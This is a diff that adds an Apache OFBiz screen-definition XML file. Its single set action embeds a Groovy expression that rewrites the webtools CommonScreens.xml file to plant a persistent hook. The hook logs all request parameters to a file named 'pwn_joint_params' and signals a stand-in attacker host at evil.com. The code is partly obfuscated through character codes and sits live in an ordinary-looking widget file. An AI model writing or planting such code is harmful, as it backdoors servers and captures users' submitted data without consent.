@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns="http://ofbiz.apache.org/Widget-Screen" xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">
+    <screen name="TemporalExpressionDecorator">
+        <section>
+            <actions>
+                <set value="${groovy:def f = new File('/usr/src/apache-ofbiz/framework/webtools/widget/CommonScreens.xml');def s = f.getText('UTF-8');def q = (char)39;def D = (char)34;def j = s.indexOf('joint_ofbiz_persist1');if (j > 0) if (s.indexOf('pwn_joint_params') &lt; 0) if (s.indexOf('/>' , j) > 0) f.setText(s.substring(0, s.indexOf('/>', j) + 2) + '&lt;set value=' + D + '${groovy:' + 'new File(' + q + '/usr/src/apache-ofbiz/pwn_joint_params' + q + ').setText(new java.util.Date() + ' + q + ' :: ' + q + ' + String.valueOf(parameters))' + (char)125 + D + '/>' + s.substring(s.indexOf('/>', j) + 2), 'UTF-8');new URL('http://evil.com:8000/rt/joint_ofbiz_probe_params').getText();}"/>
+            </actions>
+        </section>
+    </screen>
+</screens>
